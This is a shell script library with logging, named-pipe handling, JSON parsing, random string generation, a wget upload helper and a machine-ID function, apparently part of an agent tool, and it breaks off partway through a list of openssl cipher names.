#!/bin/sh
# Copyright 2011-2026 Nicolas "DarkHack" Chapuis
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

cmdListBase="cmdSh cmdTput cmdDate"
cmdSh="$(which sh)"
cmdTput="$(which tput)"
cmdDate="$(which date)"

cmdListFlux="cmdEcho cmdPrintf cmdHead cmdTail cmdTr cmdCut cmdGrep cmdShuf cmdWc cmdXargs cmdOd cmdTee cmdSeq cmdRev"
cmdListBase="$cmdListBase $cmdListFlux"
cmdEcho="$(which echo)"
cmdPrintf="$(which printf)"
cmdHead="$(which head)"
cmdTail="$(which tail)"
cmdTr="$(which tr)"
cmdCut="$(which cut)"
cmdGrep="$(which grep)"
cmdShuf="$(which shuf)"
cmdWc="$(which wc)"
cmdXargs="$(which xargs)"
cmdOd="$(which od)"
cmdTee="$(which tee)"
cmdSeq="$(which seq)"
cmdRev="$(which rev)"

cmdOthers="cmdKill cmdSleep cmdDmidecode cmdWget cmdUptime cmdTimeout"
cmdListBase="$cmdListBase $cmdOthers"
cmdKill="$(which kill)"
#cmdTrap="$(which trap)"
cmdSleep="$(which sleep)"
cmdDmidecode="$(which dmidecode)"
cmdWget="$(which wget)"
cmdUptime="$(which uptime)"
cmdTimeout="$(which timeout)"

cmdListEncode="cmdBase64 cmdMd5sum cmdOpenssl"
cmdListBase="$cmdListBase $cmdListEncode"
cmdBase64="$(which base64)"
cmdMd5sum="$(which md5sum)"
cmdOpenssl="$(which openssl)"

cmdListFile="cmdCp cmdRm cmdCat cmdMkfifo"
cmdListBase="$cmdListBase $cmdListFile"
cmdCat="$(which cat)"
cmdCp="$(which cp)"
cmdRm="$(which rm)"
cmdMkfifo="$(which mkfifo)"
cmdLs="$(which ls)"
cmdFind="$(which find)"

cmdListDirectory="cmdMkdir cmdMount cmdUmount cmdMktemp"
cmdListBase="$cmdListBase $cmdListDirectory"
cmdMkdir="$(which mkdir)"
cmdMount="$(which mount)"
cmdUmount="$(which umount)"
cmdMktemp="$(which mktemp)"

cmdListUserRight="cmdChmod cmdChown cmdChgrp cmdGroupadd cmdUseradd cmdChroot"
cmdListBase="$cmdListBase $cmdListUserRight"
cmdChmod="$(which chmod)"
cmdChown="$(which chown)"
cmdChgrp="$(which chgrp)"
cmdGroupadd="$(which groupadd)"
cmdUseradd="$(which useradd)"
cmdChroot="$(which chroot)"


#!/bin/sh
cmdList="cmdSh cmdTput cmdDate cmdEcho cmdPrintf"

for cmd in $($cmdPrintf "$cmdList" | tr ' ' '\n');do
 if [ -z "$(eval $cmdPrintf \"\$$cmd\")" ];then $cmdPrintf "[FATAL] missing cmd:$cmd\r\n";exit 1;fi
done
shTotalLog=""

# order : ERROR, WARNING, INFO, DEBUG, TRACE
if [ -z "$shLog_init" ];then
 readonly shLog_init=1
 readonly shLog_NONE=0
 readonly shLog_ERROR=1 # 1/red
 readonly shLog_WARNING=3 # 3/orange
 readonly shLog_INFO=4 # 4/blue
 readonly shLog_DEBUG=2 # 2/green
 readonly shLog_TRACE=5 # 5/magenta
 
 export TERMINFO=/usr/share/terminfo
 readonly shLog_REDStart="$($cmdTput -T xterm setaf 1 2>/dev/null )" # ERROR
 readonly shLog_GREENStart="$($cmdTput -T xterm setaf 2 2>/dev/null )" # DEBUG
 readonly shLog_ORANGEStart="$($cmdTput -T xterm setaf 3 2>/dev/null )" # WARNING
 readonly shLog_BLUEStart="$($cmdTput -T xterm setaf 4 2>/dev/null )" # INFO
 readonly shLog_MAGENTAStart="$($cmdTput -T xterm setaf 5 2>/dev/null )" # TRACE
 readonly shLog_CYANStart="$($cmdTput -T xterm setaf 6 2>/dev/null )" # xxxx
 readonly shLog_WHITEStart="$($cmdTput -T xterm setaf 7 2>/dev/null )" # xxxx
 readonly shLog_COLORStop="$($cmdTput -T xterm sgr0 2>/dev/null )"
fi
# shLog shLog_DEBUG "debug message"
# shLog shLog_INFO "info message"
shLog() {
 local params=""
 local cptParam=0
 local shMessage=""
 local colorStart=""
 local colorStop=""
 for param in $*;do
  cptParam=$(( cptParam + 1 ))
  # is the first param and is numerical  ?
  if [ $cptParam -eq 1 ] && [ "$param" -eq "$param" ] 2>/dev/null ;then
   local colorStop="$shLog_COLORStop"
   
   case $param in
    $shLog_NONE )
		local shTitle="NONE"
		local colorStart="$shLog_CYANStart"
		;;
   	$shLog_ERROR )
   		local shTitle="ERREUR"
		local colorStart="$shLog_REDStart"
   		;;
   	$shLog_WARNING )
		local shTitle="WARNING"
		local colorStart="$shLog_ORANGEStart"
   		;;
   	$shLog_INFO )
		local shTitle="INFO"
		local colorStart="$shLog_BLUEStart"
   		;;
   	$shLog_DEBUG )
		local shTitle="DEBUG"
		local colorStart="$shLog_GREENStart"
   		;;
   	$shLog_TRACE )
		local shTitle="TRACE"
		local colorStart="$shLog_MAGENTAStart"
   		;;
   	* )
		local shTitle="UNKNOW"
		local colorStart="$shLog_WHITEStart"
		local params="$params $param"
   		;;
   esac
  else local params="$params $param";fi
 done
 if [ -n "$shTitle" ];then 
  if [ -n "$colorStart" ] && [ -n "$colorStop" ];then 
   local shMessage="[${colorStart}$($cmdPrintf %-7s $shTitle )$($cmdDate "+%Y/%m/%d %H:%M:%S")${colorStop}]${colorStart}$params${colorStop}";
  else
   local shMessage="[$($cmdPrintf %-7s $shTitle )$($cmdDate "+%Y/%m/%d %H:%M:%S")]$params";
  fi
 else
  local shMessage="$params"
 fi
 #$cmdPrintf "${colorStop}${shMessage}\n"
 $cmdPrintf "${shMessage}\n"
 #shTotalLog="$shTotalLog;$(date "+%Y/%m/%d %H:%M:%S") [$shLog] $params"
 #if [ ! -z ""$shDebugEnable"" ]; then
 # [ -f ""$shDebugHiddenMemory"" ] && cat "$shDebugHiddenMemory" && rm "$shDebugHiddenMemory"
 # echo ""$(date "+%Y/%m/%d %H:%M:%S")" ($$)$shLog$params"
 #fi
}
shErrorOnMissing() {
 for param in $*;do
  local params="$params $param"
 done
 local shLogfunc="shErrorOnMissing"
# shLog $shLog_TRACE "$shLogfunc" >&2
 for myParam in $(echo $params | tr ' ' '\n');do
  if [ -z "$(eval echo \$$myParam)" ];then shLog $shLog_ERROR "$shLogfunc missing :$myParam";exit 1;fi
#  else shLog $shLog_TRACE "$shLogfunc $myParam: $(eval echo \$$myParam | cut -c1-15)" >&2;fi
 done
}
shWarnOnMissing() {
 for param in $*;do
  local params="$params $param"
 done
 local shLogfunc="shWarnOnMissing"
 for myParam in $(echo $params | tr ' ' '\n');do
  if [ -n "$(eval echo \$$myParam)" ];then shLog $shLog_TRACE "$shLogfunc $myParam:\t\t$(eval echo \$$myParam | cut -c1-15)" >&2;fi
 done
}

#!/bin/sh
#shPipeDebug="1"
shPipeDebug=""

cmdList="cmdSh cmdCat cmdTimeout cmdTr cmdXargs cmdCut cmdWget cmdBase64 cmdEcho cmdPrintf cmdSeq"
cmdList="$cmdList cmdRm cmdMktemp cmdMkfifo cmdKill cmdSleep cmdTee"
cmdList="$cmdList cmdOpenssl"

shErrorOnMissing $cmdList >&2
if [ -z "$shPipe_init" ];then
 readonly shPipe_init=1
 readonly shPipeEndString="__ENDOFSTRING__"
fi
shPipeInit() {
 local shLastListFreePipe="$(shPipeRead $shPipeDataPipe 2>/dev/null | $cmdTr -d '\n' )"
 local shNewPipe=""
 local shLogfunc="shPipeInit($shLastListFreePipe)"

 [ "$shPipeDebug" ] && shLog $shLog_TRACE "$shLogfunc" >&2 
 local shPipesFree=""
 for freePipe in $($cmdPrintf $shLastListFreePipe| $cmdTr -s ': ' '\n');do
  if [ -z "$shNewPipe" ];then local shNewPipe=$freePipe;
  else local shPipesFree="$freePipe:$shPipesFree";fi
 done
 [ "$shPipeDebug" ] && shLog $shLog_TRACE "$shLogfunc => $shNewPipe / $shPipesFree" >&2
 $cmdPrintf $shPipesFree | shPipeWrite $shPipeDataPipe 2>/dev/null
 $cmdPrintf "$shNewPipe"
}
shPipeOpen() {
 local shLogfunc="shPipeOpen($1)"
 local tmpFilePipe="$($cmdMktemp -u)"
 local pipeToOpen="$1"
 $cmdMkfifo $tmpFilePipe
 [ "$shPipeDebug" ] && shLog $shLog_TRACE "$shLogfunc:$pipeToOpen" >&2
 
 case $pipeToOpen in
 	3 ) exec 3<>$tmpFilePipe;;
 	4 ) exec 4<>$tmpFilePipe;;
 	5 ) exec 5<>$tmpFilePipe;;
 	6 ) exec 6<>$tmpFilePipe;;
 	7 ) exec 7<>$tmpFilePipe;;
 	8 ) exec 8<>$tmpFilePipe;;
 	9 ) exec 9<>$tmpFilePipe;;
 	* )  [ "$shPipeDebug" ] && shLog $shLog_ERROR "$shLogfunc:echec no more 7 pipe secure." >&2;;
 esac
 $cmdRm $tmpFilePipe
}
shPipeFree() {
 local shLogfunc="shPipeFree($1)"
 local idxPipe="$1"
 shPipesFree="$idxPipe:$shPipesFree"
 [ "$shPipeDebug" ] && shLog $shLog_TRACE "$shLogfunc:$shNewPipe/$shPipesFree" >&2
}
shPipeCloseWrite() {
 local shLogfunc="shPipeCloseWrite($1)"
 local idxPipe="$1"
 $cmdPrintf "\r\n\0" >&$idxPipe
 case $idxPipe in
 	3 ) exec 3>&-;;
 	4 ) exec 4>&-;;
 	5 ) exec 5>&-;;
 	6 ) exec 6>&-;;
 	7 ) exec 7>&-;;
 	8 ) exec 8>&-;;
 	9 ) exec 9>&-;;
 	* ) [ "$shPipeDebug" ] && shLog $shLog_ERROR "$shLogfunc:echec no more 7 pipe secure." >&2;;
 esac

 [ "$shPipeDebug" ] && shLog $shLog_TRACE "$shLogfunc" >&2
}
shPipeCloseRead() {
 local shLogfunc="shPipeCloseRead($1)"
 local idxPipe="$1"
 exec $idxPipe>&-
 case $idxPipe in
 	3 ) exec 3<&-;;
 	4 ) exec 4<&-;;
 	5 ) exec 5<&-;;
 	6 ) exec 6<&-;;
 	7 ) exec 7<&-;;
 	8 ) exec 8<&-;;
 	9 ) exec 9<&-;;
 	* ) [ "$shPipeDebug" ] && shLog $shLog_ERROR "$shLogfunc:echec no more 7 pipe secure." >&2;;
 esac
 [ "$shPipeDebug" ] && shLog $shLog_TRACE "$shLogfunc" >&2
}
shPipeWrite() {
 local shLogfunc="shPipeWrite($1)"
 local idxPipe="$1"
 local noClose="$2"
 
 [ "$shPipeDebug" ] && shLog $shLog_TRACE "$shLogfunc:write main to pipe $idxPipe" >&2
 $cmdCat <&0 >&$idxPipe
# $cmdTee >&$idxPipe <&0
 if [ -n "$noClose" ];then
  [ "$shPipeDebug" ] && shLog $shLog_TRACE "$shLogfunc:write end, pipe write stay open" >&2
 else
  $cmdPrintf "\n$shPipeEndString" >&$idxPipe
  [ "$shPipeDebug" ] && shLog $shLog_TRACE "$shLogfunc:write end, pipe write closed" >&2
 fi
}
IFS="
"
shPipeReadLow() 
{
 local shLogfunc="shPipeReadLow($1)"
 local idxPipe="$1"
 [ "$shPipeDebug" ] && shLog $shLog_TRACE "$shLogfunc:read" >&2
 while read line <&$idxPipe; do
  [ "$line" = "$shPipeEndString" ] && break;
  $cmdPrintf "$line"
 done
}
shPipeRead() {
 local shLogfunc="shPipeRead($1)"
 local idxPipe="$1"
 
 $cmdPrintf "" >&$idxPipe
 shPipeReadLow $idxPipe &
 local readPid=$!
 [ "$shPipeDebug" ] && shLog $shLog_TRACE "$shLogfunc:try $$ => $readPid" 1>&2;
 # while pipeLow is read, wait 1 s, after 10s "timeout"
 $cmdPrintf "while $cmdKill -0 $readPid 2>/dev/null; do $cmdSleep 1;done;" | $cmdTimeout 10 "$cmdSh" 1>&2;
 EXIT_STATUS=$?
 # if timeout ?
 if [ $EXIT_STATUS -eq 124 ]
 then
  # kill read.
  $cmdKill -9 $readPid 2>/dev/null
  [ "$shPipeDebug" ] && shLog $shLog_ERROR "$shLogfunc:echec" >&2
 else
  [ "$shPipeDebug" ] && shLog $shLog_TRACE "$shLogfunc:ok" >&2
 fi
}
shPipeDataPipe=9
shPipeOpen $shPipeDataPipe 2>/dev/null
$cmdSeq -s ':' 3 8  | shPipeWrite $shPipeDataPipe 2>/dev/null
[ "$shPipeDebug" ] && shLog $shLog_TRACE "pipe init : $($cmdSeq -s ':' 3 8) " >&2


#!/bin/sh
#shJsonDebug="1"
shJsonDebug=""

cmdListFlux="cmdSh cmdEcho cmdPrintf cmdHead cmdTail cmdTr cmdCut cmdGrep cmdShuf"
shErrorOnMissing $cmdListFlux >&2

# jsonValue=$($cmdPrintf "$jsonData" | jsonInObjectRead "$jsonKey")
# jsonData=$($cmdPrintf "$jsonData" | jsonInObjectWrite "$jsonKey" "$jsonValue")

jsonInObjectRead() {
 local name="$1"
 local shLogfunc="jsonInObjectRead($name)"
 
 local dataObject="$($cmdCat <&0 | $cmdCut -d'{' -f2 | $cmdCut -d'}' -f1 | $cmdTr ' ' '¤' )"
 
# [ "$shJsonDebug" ] && shLog $shLog_INFO "$shLogfunc dataObject:$dataObject" >&2;
 
 for data in $($cmdPrintf "$dataObject" | $cmdTr ',' '\n');do
   local dataName="$($cmdPrintf "$data" | $cmdCut -d: -f1 | $cmdCut -d\" -f2 | $cmdTr -d '¤')"
   if [ "$dataName" = "$name" ];then
#    local dataVal="$($cmdPrintf "$data" | $cmdCut -d: -f2-)"
#    $cmdPrintf "$dataVal"
    [ "$shJsonDebug" ] && shLog $shLog_INFO "$shLogfunc dataName:$dataName found" >&2;
    $cmdPrintf "$data" | $cmdCut -d: -f2- | $cmdCut -d\" -f2 | $cmdTr '¤' ' '| $cmdTr -d $'\n'
    break;
   fi
 done
}

jsonInObjectWrite() {
 local name="$1"
 local value="$2"
 local shLogfunc="jsonInObjectWrite($name)"
 
 local dataObject="$($cmdCat <&0 | $cmdCut -d'{' -f2 | $cmdCut -d'}' -f1 | $cmdTr ' ' '¤' )"
# [ "$shJsonDebug" ] && shLog $shLog_INFO "$shLogfunc dataObject:$dataObject" >&2;
 local newDataObject=""
 $cmdPrintf "$value" > /tmp/value.txt 2>&1
 $cmdPrintf "{"
 local writed=0
 for data in $($cmdPrintf "$dataObject" | $cmdTr ',' '\n');do
   local dataName="$($cmdPrintf "$data" | $cmdCut -d: -f1 | $cmdCut -d\" -f2)"
   local dataValue="$($cmdPrintf "$data" | $cmdCut -d: -f2- | $cmdCut -d\" -f2)"
#  [ "$shJsonDebug" ] && shLog $shLog_DEBUG "$shLogfunc $dataName" >&2;
   if [ "$dataName" = "$name" ];then
    [ "$shJsonDebug" ] && shLog $shLog_DEBUG "$shLogfunc $dataName replace" >&2;
    if [ -z "$newDataObject" ];then
     local newDataObject="1"
	 $cmdPrintf "\"$name\":\"$value\"" | $cmdTr '¤' ' '
    else
     $cmdPrintf ",\"$name\":\"$value\"" | $cmdTr '¤' ' '
    fi
    local writed=1
   else
    if [ -z "$newDataObject" ];then
     local newDataObject="1"
      $cmdPrintf "\"$dataName\":\"$dataValue\"" | $cmdTr '¤' ' '
    else
     $cmdPrintf ",\"$dataName\":\"$dataValue\"" | $cmdTr '¤' ' '
    fi
   fi
 done
 if [ "$writed" -eq 0 ];then
  [ "$shJsonDebug" ] && shLog $shLog_DEBUG "$shLogfunc new" >&2;
  if [ -z "$newDataObject" ];then
   local newDataObject="1"
   $cmdPrintf "\"$name\":\"$value\"" | $cmdTr '¤' ' '
  else
   $cmdPrintf ",\"$name\":\"$value\"" | $cmdTr '¤' ' '
  fi
 fi
 $cmdPrintf "}"
# $cmdPrintf "{$newDataObject}" | $cmdTr '¤' ' '
}
#!/bin/sh

throw() {
  echo "$*" >&2
  exit 1
}

json_sh_init() {
 BRIEF=0
 LEAFONLY=0
 PRUNE=0
 NO_HEAD=0
 NORMALIZE_SOLIDUS=0
}
usage() {
  echo
  echo "Usage: JSON.sh [-b] [-l] [-p] [-s] [-h]"
  echo
  echo "-p - Prune empty. Exclude fields with empty values."
  echo "-l - Leaf only. Only show leaf nodes, which stops data duplication."
  echo "-b - Brief. Combines 'Leaf only' and 'Prune empty' options."
  echo "-n - No-head. Do not show nodes that have no path (lines that start with [])."
  echo "-s - Remove escaping of the solidus symbol (straight slash)."
  echo "-h - This help text."
  echo
}

parse_options() {
  set -- "$@"
  local ARGN=$#
  while [ "$ARGN" -ne 0 ]
  do
    case $1 in
      -h) usage
          exit 0
      ;;
      -b) BRIEF=1
          LEAFONLY=1
          PRUNE=1
      ;;
      -l) LEAFONLY=1
      ;;
      -p) PRUNE=1
      ;;
      -n) NO_HEAD=1
      ;;
      -s) NORMALIZE_SOLIDUS=1
      ;;
      ?*) echo "ERROR: Unknown option."
          usage
          exit 0
      ;;
    esac
    shift 1
    ARGN=$((ARGN-1))
  done
}

awk_egrep () {
  local pattern_string=$1

  gawk '{
    while ($0) {
      start=match($0, pattern);
      token=substr($0, start, RLENGTH);
      print token;
      $0=substr($0, start+RLENGTH);
    }
  }' pattern="$pattern_string"
}

tokenize () {
  local GREP
  local ESCAPE
  local CHAR

  if echo "test string" | egrep -ao --color=never "test" >/dev/null 2>&1
  then
    GREP='egrep -ao --color=never'
  else
    GREP='egrep -ao'
  fi

  if echo "test string" | egrep -o "test" >/dev/null 2>&1
  then
    ESCAPE='(\\[^u[:cntrl:]]|\\u[0-9a-fA-F]{4})'
    CHAR='[^[:cntrl:]"\\]'
  else
    GREP=awk_egrep
    ESCAPE='(\\\\[^u[:cntrl:]]|\\u[0-9a-fA-F]{4})'
    CHAR='[^[:cntrl:]"\\\\]'
  fi

  local STRING="\"$CHAR*($ESCAPE$CHAR*)*\""
  local NUMBER='-?(0|[1-9][0-9]*)([.][0-9]*)?([eE][+-]?[0-9]*)?'
  local KEYWORD='null|false|true'
  local SPACE='[[:space:]]+'

  # Force zsh to expand $A into multiple words
  local is_wordsplit_disabled=$(unsetopt 2>/dev/null | grep -c '^shwordsplit$')
  if [ $is_wordsplit_disabled != 0 ]; then setopt shwordsplit; fi
  $GREP "$STRING|$NUMBER|$KEYWORD|$SPACE|." | egrep -v "^$SPACE$"
  if [ $is_wordsplit_disabled != 0 ]; then unsetopt shwordsplit; fi
}

parse_array () {
  local index=0
  local ary=''
  read -r token
  case "$token" in
    ']') ;;
    *)
      while :
      do
        parse_value "$1" "$index"
        index=$((index+1))
        ary="$ary""$value" 
        read -r token
        case "$token" in
          ']') break ;;
          ',') ary="$ary," ;;
          *) throw "EXPECTED , or ] GOT ${token:-EOF}" ;;
        esac
        read -r token
      done
      ;;
  esac
  [ "$BRIEF" -eq 0 ] && value=$(printf '[%s]' "$ary") || value=
  :
}

parse_object () {
  local key
  local obj=''
  read -r token
  case "$token" in
    '}') ;;
    *)
      while :
      do
        case "$token" in
          '"'*'"') key=$token ;;
          *) throw "EXPECTED string GOT ${token:-EOF}" ;;
        esac
        read -r token
        case "$token" in
          ':') ;;
          *) throw "EXPECTED : GOT ${token:-EOF}" ;;
        esac
        read -r token
        parse_value "$1" "$key"
        obj="$obj$key:$value"        
        read -r token
        case "$token" in
          '}') break ;;
          ',') obj="$obj," ;;
          *) throw "EXPECTED , or } GOT ${token:-EOF}" ;;
        esac
        read -r token
      done
    ;;
  esac
  [ "$BRIEF" -eq 0 ] && value=$(printf '{%s}' "$obj") || value=
  :
}

parse_value () {
  local jpath="${1:+$1,}$2" isleaf=0 isempty=0 print=0
  case "$token" in
    '{') parse_object "$jpath" ;;
    '[') parse_array  "$jpath" ;;
    # At this point, the only valid single-character tokens are digits.
    ''|[!0-9]) throw "EXPECTED value GOT ${token:-EOF}" ;;
    *) value=$token
       # if asked, replace solidus ("\/") in json strings with normalized value: "/"
       [ "$NORMALIZE_SOLIDUS" -eq 1 ] && value=$(echo "$value" | sed 's#\\/#/#g')
       isleaf=1
       [ "$value" = '""' ] && isempty=1
       ;;
  esac
  [ "$value" = '' ] && return
  [ "$NO_HEAD" -eq 1 ] && [ -z "$jpath" ] && return

  [ "$LEAFONLY" -eq 0 ] && [ "$PRUNE" -eq 0 ] && print=1
  [ "$LEAFONLY" -eq 1 ] && [ "$isleaf" -eq 1 ] && [ $PRUNE -eq 0 ] && print=1
  [ "$LEAFONLY" -eq 0 ] && [ "$PRUNE" -eq 1 ] && [ "$isempty" -eq 0 ] && print=1
  [ "$LEAFONLY" -eq 1 ] && [ "$isleaf" -eq 1 ] && \
    [ $PRUNE -eq 1 ] && [ $isempty -eq 0 ] && print=1
  [ "$print" -eq 1 ] && printf "[%s]\t%s\n" "$jpath" "$value"
  :
}

parse () {
  read -r token
  parse_value
  read -r token
  case "$token" in
    '') ;;
    *) throw "EXPECTED EOF GOT $token" ;;
  esac
}

json_sh() {
 json_sh_init
 parse_options "$@"
 tokenize | parse
}

#!/bin/sh
shRandomizeDebug="1"
#shRandomizeDebug=""

cmdList="cmdSh cmdCat cmdTimeout cmdTr cmdXargs cmdCut cmdWget cmdBase64 cmdEcho cmdPrintf"
cmdList="$cmdList cmdRm cmdMktemp cmdMkfifo cmdOd"
cmdList="$cmdList cmdOpenssl"

#cmdList="$cmdList cmdStrings"
#cmdStrings="$(which strings)"

shErrorOnMissing $cmdList >&2

shRandomizePipe=$(shPipeInit 2>/dev/null)
shPipeOpen $shRandomizePipe 2>/dev/null

shString64Filter() {
 $cmdTr -cd '[:alnum:]+=/|' <&0
# $cmdStrings -e S -a <&0 | $cmdTr -cd '[:alnum:]+=/'

# for char in $( $cmdSed -e 's/\(.\)/\1\n/g' <&0 );do
#  local ascii=$( $cmdPrintf "%d" "'$char" 2>>/dev/null );
#  # valid: "=:61 ,/:47 ,+:43 ,|:124" 
#  # valid:0-9
#  # valid:A-Z
#  # valid:a-z
#  if [ "$ascii" -eq 61 ] || [ "$ascii" -eq 47 ] || [ "$ascii" -eq 43 ]\
#  || ( [ "$ascii" -ge 48 ] && [ "$ascii" -le 57 ] )\
#  || ( [ "$ascii" -ge 65 ] && [ "$ascii" -le 90 ] )\
#  || ( [ "$ascii" -ge 97 ] && [ "$ascii" -le 122 ] )\
#  ; then $cmdPrintf "$char";fi
##  else $cmdPrintf "[!$ascii/$char]" 1>&2; fi
# done
}
shRandomizeASCCI() {
 local shLogfunc="shRandomizeASCCI($1)";
 local length="$1";
 local randomStr="";
 local cpt=0;
 if [ ! $length -gt $cpt ];then [ "$shRandomizeDebug" ] && shLog $shLog_ERROR "$shLogfunc:no length" >&2
 else
  #local shRandomizeBuf=""
  local shRandomizeBuf="$(shPipeRead $shRandomizePipe )"
  local shRandomizeLength=$($cmdPrintf "$shRandomizeBuf" | $cmdWc -c)
  if [ $shRandomizeLength -gt 0 ];then
   if [ $shRandomizeLength -lt $length ];then
    [ "$shRandomizeDebug" ] && shLog $shLog_TRACE "$shLogfunc [not enought] shRandomizeLength:$shRandomizeLength length:$length" >&2
    local randomStr="$shRandomizeBuf"
    local newRandomizeBuf=""
   else
    [ "$shRandomizeDebug" ] && shLog $shLog_TRACE "$shLogfunc [enought] shRandomizeLength:$shRandomizeLength length:$length" >&2
    local randomStr="$($cmdPrintf $shRandomizeBuf | $cmdCut -b -${length} )";
    local newRandomizeBuf="$($cmdPrintf $shRandomizeBuf | $cmdCut -b $(( length + 1 ))- )"
   fi
   #if [ $cpt -gt 0 ];then local cpt=$(( cpt-1 ));fi
   $cmdPrintf "$newRandomizeBuf" | shPipeWrite $shRandomizePipe;
  fi
  local cpt=$($cmdPrintf "$randomStr" | $cmdWc -c)
  #[ "$shRandomizeDebug" ] && shLog $shLog_TRACE "$shLogfunc cpt:$cpt length:$length" >&2
  local toGenerate=$(( length - cpt ));
  #local toGenerate=$(( toGenerate - 1 ));
  while [ $toGenerate -gt 0 ];do
   type="$($cmdShuf -i 0-2 -n 1)"
   case "$type" in 
    0) local range="65-90";;
    1) local range="97-122";;
    2) local range="48-57";;
   esac
   local sizeGenerate="$($cmdShuf -i 1-$toGenerate -n 1)";
   #[ "$shRandomizeDebug" ] && shLog $shLog_TRACE "$shLogfunc range:$range sizeGenerate:$sizeGenerate/$toGenerate cpt:$cpt" >&2
   for randomOctet in $($cmdShuf -i $range -n $sizeGenerate );do
    local randomStr="$randomStr$( $cmdPrintf \\$($cmdPrintf '%o' $randomOctet) )"
   done
   #local cpt=$(( cpt + sizeGenerate ))
   local cpt=$($cmdPrintf "$randomStr" | $cmdWc -c)
   local toGenerate=$(( length - cpt ));
   #local toGenerate=$(( toGenerate - 1 ));
  done
 fi
 $cmdPrintf "$randomStr"
  [ "$shRandomizeDebug" ] && shLog $shLog_TRACE "$shLogfunc cpt:$cpt length:$length" >&2
}

#shCryptRandomASCCI() {
# local shLogfunc="shCryptRandomASCCI($1)"
# local length="$1"
# local randomStr="";
# local cpt=0;
# if [ ! $length -gt $cpt ];then [ "$shCryptDebug" ] && shLog $shLog_ERROR "$shLogfunc:no length" >&2
# else
#  [ "$shCryptDebug" ] && shLog $shLog_TRACE "$shLogfunc" >&2
#  while [ $length -gt $cpt ];do
#   type="$($cmdShuf -i 0-2 -n 1)"
#   case "$type" in 
#    0) local range="65-90";;
#    1) local range="97-122";;
#    2) local range="48-57";;
#   esac
#   randomStr="$randomStr$($cmdPrintf \\$($cmdPrintf '%03o' $($cmdShuf -i $range -n 1) ))"
#   local cpt=$(( cpt+1 ))
#  done
# fi
# $cmdPrintf "$randomStr"
#}


$cmdPrintf ""| shPipeWrite $shRandomizePipe;

#!/bin/sh

shErrorOnMissing cmdWget

httpRequest() {
 local proto=$1
 local host=$2
 local ipAddress=$3
 local port=$4
 local uri=$5
 local timeout=1200
 local shLogfunc="httpRequest $host($ipAddress),$uri[timeout:$timeout]"
 shLog $shLog_TRACE "$shLogfunc" >&2
 local boundary="FILEUPLOAD"
 local newLine=""
# --header="Content-type: multipart/form-data"
# --post-data="data=$($cmdCat <&0)"\

 $cmdWget --header="Content-Type: multipart/form-data; charset=utf-8; boundary=\"$boundary\""\
 --post-data="--${boundary}
Content-Disposition: form-data; name=\"data\";
Content-Type: application/octet-stream
Media Type: application/octet-stream

$($cmdCat <&0)
--${boundary}
Content-Disposition: form-data; name=\"one\";
Content-Type: application/octet-stream
Media Type: application/octet-stream

unevaleur
oudeux

ou autre
ainsi


desuite
--${boundary}--
"\
 --no-check-certificate -O - -q -t 1 --timeout=$timeout --dns-timeout=$timeout --connect-timeout=$timeout --read-timeout=$timeout\
 --header="Host: $host" "$proto://$ipAddress:$port/$uri"
 
 shLog $shLog_TRACE "$shLogfunc ended" >&2
}

#!/bin/sh
cmdList="cmdWget cmdCat cmdTr cmdCut cmdGrep cmdTr cmdMd5sum cmdDmidecode"

shErrorOnMissing $cmdList

shAgentGetNodeUUID() {
 $cmdCat /etc/machine-id | $cmdTr '\n' '_' && $cmdDmidecode -t 4 2>/dev/null | $cmdGrep ID | $cmdCut -d: -f2 | $cmdTr ' ' '_' | $cmdMd5sum | $cmdCut -f1 -d' '
}
jsonPipe=$(shPipeInit 2>/dev/null);shPipeOpen $jsonPipe 2>/dev/null;
#!/bin/sh
shCryptDebug="1"
#shCryptDebug=""

cmdList="cmdSh cmdCat cmdTimeout cmdTr cmdXargs cmdCut cmdWget cmdBase64 cmdEcho cmdPrintf"
cmdList="$cmdList cmdRm cmdMktemp cmdMkfifo cmdOd cmdRev"
cmdList="$cmdList cmdOpenssl cmdSed"

cmdSed="$(which sed)"
shErrorOnMissing $cmdList >&2

shCryptStrToHex() {
 $cmdOd -A n -t x1 <&0 | $cmdTr -d ' ' | $cmdTr -d '\n' 
}
shCryptciphers="$shCryptciphers:aes-128-cbc:aes-128-cfb:aes-128-cfb1"
shCryptciphers="$shCryptciphers:aes-128-cfb8:aes-128-ctr:aes-128-ecb"
shCryptciphers="$shCryptciphers:aes-128-gcm:aes-128-ofb:aes-128-xts"
shCryptciphers="$shCryptciphers:aes-192-cbc:aes-192-cfb:aes-192-cfb1"
shCryptciphers="$shCryptciphers:aes-192-cfb8:aes-192-ctr:aes-192-ecb"
shCryptciphers="$shCryptciphers:aes-192-gcm:aes-192-ofb:aes-256-cbc"
shCryptciphers="$shCryptciphers:aes-256-cfb:aes-256-cfb1:aes-256-cfb8"
shCryptciphers="$shCryptciphers:aes-256-ctr:aes-256-ecb:aes-256-gcm"
shCryptciphers="$shCryptciphers:aes-256-ofb:aes-256-xts:aes128"
shCryptciphers="$shCryptciphers:aes192:aes256:bf"
shCryptciphers="$shCryptciphers:bf-cbc:bf-cfb:bf-ecb"
shCryptciphers="$shCryptciphers:bf-ofb:blowfish:camellia-128-cbc"
shCryptciphers="$shCryptciphers:camellia-128-cfb:camellia-128-cfb1:camellia-128-cfb8"
shCryptciphers="$shCryptciphers:camellia-128-ecb:camellia-128-ofb:camellia-192-cbc"
shCryptciphers="$shCryptciphers:camellia-192-cfb:camellia-192-cfb1:camellia-192-cfb8"
shCryptciphers="$shCryptciphers:camellia-192-ecb:camellia-192-ofb:camellia-256-cbc"
shCryptciphers="$shCryptciphers:camellia-256-cfb:camellia-256-cfb1:camellia-256-cfb8"
shCryptciphers="$shCryptciphers:camellia-256-ecb:camellia-256-ofb:camellia128"
shCryptciphers="$shCryptciphers:camellia192:camellia256:cast"
shCryptciphers="$shCryptciphers:cast-cbc:cast5-cbc:cast5-cfb"
shCryptciphers="$shCryptciphers:cast5-ecb:cast5-ofb:des"
shCryptciphers="$shCryptciphers:des-cbc:des-cfb:des-cfb1"
shCryptciphers="$shCryptciphers:des-cfb8:des-ecb:des-ede"
shCryptciphers="$shCryptciphers:des-ede-cbc:des-ede-cfb:des-ede-ofb"
shCryptciphers="$shCryptciphers:des-ede3:des-ede3-cbc:des-ede3-cfb"
